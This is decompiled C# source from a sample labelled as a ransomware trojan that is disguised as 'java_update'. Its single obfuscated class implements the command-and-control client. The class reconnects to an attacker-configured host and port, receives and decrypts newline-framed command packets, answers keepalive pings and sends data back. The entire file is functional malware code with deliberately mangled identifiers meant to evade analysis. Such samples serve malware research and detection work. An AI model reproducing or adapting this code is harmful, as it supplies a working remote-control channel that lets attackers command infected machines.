// Decompiled with JetBrains decompiler
// Type: ᏬĴவߙւ̞ᙘ.ੴᴏ઩ࣸ᪃ỷᡀᄍ
// Assembly: java_update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 557F7238-B13A-4798-94BE-2CA1CC027032
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-501fe6aaa92a5c9bad3bf6a1cdf6d5d77d5236bad8aca53c2ce66f490a365092.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ᏬĴவߙւ̞ᙘ
{
  internal class ੴᴏ\u0AA9ࣸ᪃ỷᡀᄍ
  {
    private Socket ᮙࠋӻƿԁ\u058Eዛ\u1DFAᕊ\u1CFE\u0BD3ஒᬮẁᣝࠪᓮվȖ;
    private bool \u1CFDፓἕീᅘᘯᤡؚ\u197B۫ᡕࣽᚊᚁ;
    private Thread Иᗄ᭖Н\u0FC3ḗ\u1CC3ᯬʹاडḪ\u0E72ٖጫݢͥ;
    private Thread \u0EE6Ñࡆ\u0835\u16FBྦฒ\u0BACೀѾ\u0E5EҨ\u02D6ᑈҬ҇ᓄ;
    private Thread ᣘšᆒᐢ9ᚦᱜܘ\u0836ᝄયἄُ;
    private string ᓯ\u0E7EޣᖰᆲᬣḉயᕋЗᅗᡅඍᵐ͐ᐙ\u197E৪ბ;
    private int \u0DC9Ȅࠬᨃ\u0097;
    private string ଙ\u0FE3ݰᘍü\u0CFCᵮ໕\u0EF8\u1398ಥ\u0E3Cሕ;
    private bool ዜഩ\u0B55ൻˋܴङṋχ፝ᴆÅาӉᄀያ;

    public ੴᴏ\u0AA9ࣸ᪃ỷᡀᄍ(string Host, int Port, string Password)
    {
      this.ᓯ\u0E7EޣᖰᆲᬣḉயᕋЗᅗᡅඍᵐ͐ᐙ\u197E৪ბ = Host;
      this.\u0DC9Ȅࠬᨃ\u0097 = Port;
      this.ଙ\u0FE3ݰᘍü\u0CFCᵮ໕\u0EF8\u1398ಥ\u0E3Cሕ = Password;
      this.\u1CFDፓἕീᅘᘯᤡؚ\u197B۫ᡕࣽᚊᚁ = false;
      this.ዜഩ\u0B55ൻˋܴङṋχ፝ᴆÅาӉᄀያ = false;
    }

    public Socket කᢷᑽw١ => this.ᮙࠋӻƿԁ\u058Eዛ\u1DFAᕊ\u1CFE\u0BD3ஒᬮẁᣝࠪᓮվȖ;

    public bool \u0334ଢ଼ႉ\u0BFE1СᨲௗЇֶἀ\u0FD4គᏽࠏ៊ɤ࡙ӷ => this.\u1CFDፓἕീᅘᘯᤡؚ\u197B۫ᡕࣽᚊᚁ;

    public string ᘉണᣪᑋ᥇ỹᅦսჾ => this.ᓯ\u0E7EޣᖰᆲᬣḉயᕋЗᅗᡅඍᵐ͐ᐙ\u197E৪ბ;

    public int \u05C2Ϊዄພᝧխ᤻\u060AMἻۍᄈޕ\u060Eᖑ => this.\u0DC9Ȅࠬᨃ\u0097;

    public string Ǻ֒ᤫᔐᙓత => this.ଙ\u0FE3ݰᘍü\u0CFCᵮ໕\u0EF8\u1398ಥ\u0E3Cሕ;

    public void \u1B4Cᇰᵼʑᶎ\u00A5Րݣ᭯ᗀҸᇙשڦ() => this.ഫሀưᝅઢМ\u0BBB\u139Bᇈᢝᄉ();

    private void ഫሀưᝅઢМ\u0BBB\u139Bᇈᢝᄉ()
    {
      if (this.\u1CFDፓἕീᅘᘯᤡؚ\u197B۫ᡕࣽᚊᚁ)
        return;
      this.ᣘšᆒᐢ9ᚦᱜܘ\u0836ᝄયἄُ = new Thread((ThreadStart) (() =>
      {
        this.ᮙࠋӻƿԁ\u058Eዛ\u1DFAᕊ\u1CFE\u0BD3ஒᬮẁᣝࠪᓮվȖ = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        while (!this.ᮙࠋӻƿԁ\u058Eዛ\u1DFAᕊ\u1CFE\u0BD3ஒᬮẁᣝࠪᓮվȖ.Connected)
        {
          try
          {
            this.ᮙࠋӻƿԁ\u058Eዛ\u1DFAᕊ\u1CFE\u0BD3ஒᬮẁᣝࠪᓮվȖ.Connect(this.ᓯ\u0E7EޣᖰᆲᬣḉயᕋЗᅗᡅඍᵐ͐ᐙ\u197E৪ბ, this.\u0DC9Ȅࠬᨃ\u0097);
          }
          catch
          {
            Thread.Sleep(TimeSpan.FromSeconds((double) ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u0E69ߨ၅\u0488lᇓ\u1A9Aผ\u17D5౮ۍ));
          }
        }
        this.ᵲ\u0BF6Ỗ᪲ᏳҋᙩᣇˋഔೌŘ();
      }));
      this.ᣘšᆒᐢ9ᚦᱜܘ\u0836ᝄયἄُ.Start();
    }

    private void ᵲ\u0BF6Ỗ᪲ᏳҋᙩᣇˋഔೌŘ()
    {
      if (this.\u1CFDፓἕീᅘᘯᤡؚ\u197B۫ᡕࣽᚊᚁ)
        return;
      this.\u1CFDፓἕീᅘᘯᤡؚ\u197B۫ᡕࣽᚊᚁ = true;
      if (this.ೠᔘÒဉฦпṾ̚ == null)
        return;
      this.ೠᔘÒဉฦпṾ̚((object) this, (EventArgs) null);
    }

    public void \u060FᆊᏏጨ\u1C99႗ķ\u001E᠕ใο̇᧔᪇ʊզᇑ()
    {
      this.Иᗄ᭖Н\u0FC3ḗ\u1CC3ᯬʹاडḪ\u0E72ٖጫݢͥ = new Thread(new ThreadStart(this.ӟ\u066DൟᵒǦ࡛᭫Ἓᛞᬭᡊ\u0EC5\u1C8B));
      this.Иᗄ᭖Н\u0FC3ḗ\u1CC3ᯬʹاडḪ\u0E72ٖጫݢͥ.Start();
      this.\u0EE6Ñࡆ\u0835\u16FBྦฒ\u0BACೀѾ\u0E5EҨ\u02D6ᑈҬ҇ᓄ = new Thread((ThreadStart) (() =>
      {
        while (true)
        {
          Thread.Sleep(TimeSpan.FromSeconds(45.0));
          if (this.ዜഩ\u0B55ൻˋܴङṋχ፝ᴆÅาӉᄀያ)
            this.ዜഩ\u0B55ൻˋܴङṋχ፝ᴆÅาӉᄀያ = false;
          else
            break;
        }
        this.\u135F\u0F0B\u19E8ঠӁဲه(true);
      }));
      this.\u0EE6Ñࡆ\u0835\u16FBྦฒ\u0BACೀѾ\u0E5EҨ\u02D6ᑈҬ҇ᓄ.Start();
    }

    private void ӟ\u066DൟᵒǦ࡛᭫Ἓᛞᬭᡊ\u0EC5\u1C8B()
    {
      try
      {
        MemoryStream ms = new MemoryStream();
        byte[] array;
        do
        {
          array = new byte[this.ᮙࠋӻƿԁ\u058Eዛ\u1DFAᕊ\u1CFE\u0BD3ஒᬮẁᣝࠪᓮվȖ.ReceiveBufferSize];
          int num = this.ᮙࠋӻƿԁ\u058Eዛ\u1DFAᕊ\u1CFE\u0BD3ஒᬮẁᣝࠪᓮվȖ.Receive(array, 0, array.Length, SocketFlags.Partial);
          if (num <= 0)
            throw new SocketException();
          Array.Resize<byte>(ref array, num);
          ms.Write(array, 0, num);
        }
        while (!(char.ConvertFromUtf32((int) array[array.Length - 1]) == "\n"));
        ms.Close();
        new Thread((ThreadStart) (() =>
        {
          this.\u1BEF\u02F4\u0EBFẳڂjবດ\u0E5Cኯᘙቑἂ(ms.ToArray());
          ms.Dispose();
          ms = (MemoryStream) null;
        })).Start();
      }
      catch (SocketException ex)
      {
        this.\u135F\u0F0B\u19E8ঠӁဲه(true);
        return;
      }
      catch (Exception ex)
      {
        this.\u135F\u0F0B\u19E8ঠӁဲه(true);
        Console.WriteLine(ex.Message);
      }
      this.ӟ\u066DൟᵒǦ࡛᭫Ἓᛞᬭᡊ\u0EC5\u1C8B();
    }

    private void \u1BEF\u02F4\u0EBFẳڂjবດ\u0E5Cኯᘙቑἂ(byte[] _param1)
    {
      List<byte> byteList = new List<byte>();
      for (int index = 0; index < _param1.Length; ++index)
      {
        if (char.ConvertFromUtf32((int) _param1[index]) != "\n")
        {
          byteList.Add(_param1[index]);
        }
        else
        {
          this.ၛ֖࣮Èᓒᶩ\u07F6Ϳᆓ\u09FFቂዦ̞\u1CCF(byteList.ToArray());
          byteList.Clear();
        }
      }
    }

    private void ၛ֖࣮Èᓒᶩ\u07F6Ϳᆓ\u09FFቂዦ̞\u1CCF(byte[] _param1)
    {
      try
      {
        MemoryStream memoryStream = new MemoryStream(ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A6B\u0FEAᛈᓎୣᵈ୧ᬈክᡉᕧҐ\u07BC\u0BF6(_param1, true));
        byte[] buffer = new byte[4];
        memoryStream.Read(buffer, 0, buffer.Length);
        ੴᴏ\u0AA9ࣸ᪃ỷᡀᄍ.ᐏ௩ᇄ࣯ᙂᘞၠ\u1C3B\u0BA1ᓨ᮶ᡌ int32 = (ੴᴏ\u0AA9ࣸ᪃ỷᡀᄍ.ᐏ௩ᇄ࣯ᙂᘞၠ\u1C3B\u0BA1ᓨ᮶ᡌ) BitConverter.ToInt32(buffer, 0);
        byte[] numArray = new byte[memoryStream.Length - 4L];
        memoryStream.Read(numArray, 0, numArray.Length);
        memoryStream.Close();
        memoryStream.Dispose();
        if (int32 != ੴᴏ\u0AA9ࣸ᪃ỷᡀᄍ.ᐏ௩ᇄ࣯ᙂᘞၠ\u1C3B\u0BA1ᓨ᮶ᡌ.\u173Aྲྀᗶฟబ\u0A7C\u1C88ӕ\u0AF2ᵦj\u009Eᇟॲ\u00B1ߥຕ៥)
        {
          if (this.ἄᡣᅂ\u08D8Ҷ࣪ఖ\u0A61ᶱ\u0C5E\u0A60 != null)
            this.ἄᡣᅂ\u08D8Ҷ࣪ఖ\u0A61ᶱ\u0C5E\u0A60((object) this, new \u0CF8ᛛ\u0FD4ᩜᕽࠐࡒైઆî\u007FჵឤŔᯋ(numArray, numArray.Length, int32));
        }
        else
        {
          this.ዜഩ\u0B55ൻˋܴङṋχ፝ᴆÅาӉᄀያ = true;
          this.\u0E4B൨ጛᒰጂ໋ᓊ̰ܡ\u0BBDȷᗹᦞ();
        }
        _param1 = (byte[]) null;
      }
      catch
      {
        ຳജ\u02F4\u197FᠼᐼଃቢᎥਭɃ ຳജᠼᐼଃቢᎥਭɃ = new ຳജ\u02F4\u197FᠼᐼଃቢᎥਭɃ();
        ຳജᠼᐼଃቢᎥਭɃ.Write("Broken Packet");
        this.ʀ\u0D53ᠺዲͳ(new ڗ\u1ACCሔ᭮\u0ECFԜॏḷ\u0DE4ࣳ(ੴᴏ\u0AA9ࣸ᪃ỷᡀᄍ.ᐏ௩ᇄ࣯ᙂᘞၠ\u1C3B\u0BA1ᓨ᮶ᡌ.ь᷊ɇెКឱ᳖ᳫṖׂ\u0F07\u1AC1᧔ҶᴞṄ, ຳജᠼᐼଃቢᎥਭɃ.ᓏ\u13FEᜂᣙ\u1400()).ᶃƅßܼᰶឯ\u0A65());
      }
    }

    public int ʀ\u0D53ᠺዲͳ(byte[] _param1)
    {
      try
      {
        int sent = this.ᮙࠋӻƿԁ\u058Eዛ\u1DFAᕊ\u1CFE\u0BD3ஒᬮẁᣝࠪᓮվȖ.Send(_param1, 0, _param1.Length, SocketFlags.Partial) + this.ᮙࠋӻƿԁ\u058Eዛ\u1DFAᕊ\u1CFE\u0BD3ஒᬮẁᣝࠪᓮվȖ.Send(this.ᴕटᕑᆳ\u1B7Dᇷxᇻᒴᨘඳἴ᭕᱐ࣤᯕʡ, 0, 1, SocketFlags.Partial);
        if (this.\u0DEA\u009Fᗯ\u19F0\u1737ᢢ߆ఎఛፒᡇ7Ḋᢥᴔ\u1B4D != null && sent != 0)
          this.\u0DEA\u009Fᗯ\u19F0\u1737ᢢ߆ఎఛፒᡇ7Ḋᢥᴔ\u1B4D((object) this, new \u19D6ڑ\u0DCEḦྼẝ\u0704ᘎĩƕ८ᶏᜈᕰᱺພ\u1AAC\u1B5A(sent));
        return sent;
      }
      catch
      {
        return 0;
      }
    }

    private byte[] ᴕटᕑᆳ\u1B7Dᇷxᇻᒴᨘඳἴ᭕᱐ࣤᯕʡ => Encoding.ASCII.GetBytes("\n");

    private void \u0E4B൨ጛᒰጂ໋ᓊ̰ܡ\u0BBDȷᗹᦞ() => this.ʀ\u0D53ᠺዲͳ(new ڗ\u1ACCሔ᭮\u0ECFԜॏḷ\u0DE4ࣳ(ੴᴏ\u0AA9ࣸ᪃ỷᡀᄍ.ᐏ௩ᇄ࣯ᙂᘞၠ\u1C3B\u0BA1ᓨ᮶ᡌ.\u173Aྲྀᗶฟబ\u0A7C\u1C88ӕ\u0AF2ᵦj\u009Eᇟॲ\u00B1ߥຕ៥, new byte[0]).ᶃƅßܼᰶឯ\u0A65());

    public void Ệᵀᑡǀལᔭኊឱ(string _param1)
    {
      ຳജ\u02F4\u197FᠼᐼଃቢᎥਭɃ ຳജᠼᐼଃቢᎥਭɃ = new ຳജ\u02F4\u197FᠼᐼଃቢᎥਭɃ();
      ຳജᠼᐼଃቢᎥਭɃ.Write(_param1);
      this.ʀ\u0D53ᠺዲͳ(new ڗ\u1ACCሔ᭮\u0ECFԜॏḷ\u0DE4ࣳ(ੴᴏ\u0AA9ࣸ᪃ỷᡀᄍ.ᐏ௩ᇄ࣯ᙂᘞၠ\u1C3B\u0BA1ᓨ᮶ᡌ.ь᷊ɇెКឱ᳖ᳫṖׂ\u0F07\u1AC1᧔ҶᴞṄ, ຳജᠼᐼଃቢᎥਭɃ.ᓏ\u13FEᜂᣙ\u1400()).ᶃƅßܼᰶឯ\u0A65());
    }

    public bool \u135F\u0F0B\u19E8ঠӁဲه(bool _param1)
    {
      if (!this.\u1CFDፓἕീᅘᘯᤡؚ\u197B۫ᡕࣽᚊᚁ)
        return false;
      this.ኛદᄔᛆ\u19E5ྲƕݕἣ\u10C8();
      this.\u1CFDፓἕീᅘᘯᤡؚ\u197B۫ᡕࣽᚊᚁ = false;
      if (_param1 && this.ᨖ\u1DF8๗\u0EF8ݴୁ\u1715 != null)
        this.ᨖ\u1DF8๗\u0EF8ݴୁ\u1715((object) this, (EventArgs) null);
      return true;
    }

    public void ኛદᄔᛆ\u19E5ྲƕݕἣ\u10C8()
    {
      try
      {
        this.ᮙࠋӻƿԁ\u058Eዛ\u1DFAᕊ\u1CFE\u0BD3ஒᬮẁᣝࠪᓮվȖ.Close();
        this.ᮙࠋӻƿԁ\u058Eዛ\u1DFAᕊ\u1CFE\u0BD3ஒᬮẁᣝࠪᓮվȖ = (Socket) null;
      }
      catch
      {
      }
      try
      {
        this.Иᗄ᭖Н\u0FC3ḗ\u1CC3ᯬʹاडḪ\u0E72ٖጫݢͥ.Abort();
        this.Иᗄ᭖Н\u0FC3ḗ\u1CC3ᯬʹاडḪ\u0E72ٖጫݢͥ = (Thread) null;
      }
      catch
      {
      }
      try
      {
        this.\u0EE6Ñࡆ\u0835\u16FBྦฒ\u0BACೀѾ\u0E5EҨ\u02D6ᑈҬ҇ᓄ.Abort();
        this.\u0EE6Ñࡆ\u0835\u16FBྦฒ\u0BACೀѾ\u0E5EҨ\u02D6ᑈҬ҇ᓄ = (Thread) null;
      }
      catch
      {
      }
    }

    public event EventHandler ConnectionAccepted;

    public event EventHandler Disconnected;

    public event EventHandler<\u19D6ڑ\u0DCEḦྼẝ\u0704ᘎĩƕ८ᶏᜈᕰᱺພ\u1AAC\u1B5A> Sent;

    public event EventHandler<\u0CF8ᛛ\u0FD4ᩜᕽࠐࡒైઆî\u007FჵឤŔᯋ> Received;

    public enum ᐏ௩ᇄ࣯ᙂᘞၠ\u1C3B\u0BA1ᓨ᮶ᡌ
    {
      ቊƱޯሞד = 0,
      ऴᛵ\u09D8ྏᣆౄ\u1CA6\u1B5Bᝌݩڂ = 1,
      \u07C8ʆ\u0CB4ṒƤਜᯭᠵӞʫ\u17FEןݾᠡ૭ = 2,
      ᳩቝйỦ̜ߪ೪ᢪቢ = 3,
      \u1B62ི\u1AE6ߟ\u09FE\u08C2Ỵசᴈḩ\u136Fጸ\u000C\u1CD3ᕱ\u0CDDॹڈ = 4,
      Ϲࠐ\u00A4ŖጩᶲӮ̯ۛ\u136BἝᓜፉ௯֒\u0DF9\u0C7A\u1C8F\u1C3F = 5,
      \u0F3Bتᬤᩙఃᕌরቑڦॵᕿᶰ١ᦳ\u0E69ፁ = 6,
      ป\u07BC६Ԑ֓᠘ᝮᴪ्\u0026݈ᦹ\u0EDAࣶྍ\u0C7Aෛ = 7,
      ᴏబ\u058Bᒒᴜᐁᇜᯉ\u1CA6ᴬŬ\u0E7B = 8,
      \u1CC6ᆑቻᶞᓒዒዝধ\u0D51εᱯʶᔦɨៗᜌ = 9,
      Ȋာطˢ\u0590Ű = 15, // 0x0000000F
      ױᄶៅશ႙ = 16, // 0x00000010
      ᔲᣉৠᒫታउ᪲ᦂ = 17, // 0x00000011
      ᨑڐূࠨᮞગ\u19FAᣨᨾՔ\u0FBD\u0877\u085Cᇛ\u07F6ᆙ\u1945ҽ = 18, // 0x00000012
      \u173Aྲྀᗶฟబ\u0A7C\u1C88ӕ\u0AF2ᵦj\u009Eᇟॲ\u00B1ߥຕ៥ = 19, // 0x00000013
      \u1AADᔧଷឍ\u1CC6բÜᷜೖۮǩ̒ = 20, // 0x00000014
      ь᷊ɇెКឱ᳖ᳫṖׂ\u0F07\u1AC1᧔ҶᴞṄ = 21, // 0x00000015
      \u09F5ᢠᣳখॏ\u0700ఃᜨ = 22, // 0x00000016
      \u08BC\u0B50\u0BE0ྲᴦईᩔܼᮑፕܫᎪϊᘤᩏሃ = 23, // 0x00000017
      ཥ᭯ᰌ\u02F2\u00AC\u02FDỗԫ\u1C38\u0889फ़໗ᨽᛉᖃᑞ૫\u0EF5 = 24, // 0x00000018
      ᄋຣߛ\u05FFmኘ\u0865\u09C9\u1719ፀثɼᷣ = 25, // 0x00000019
    }
  }
}
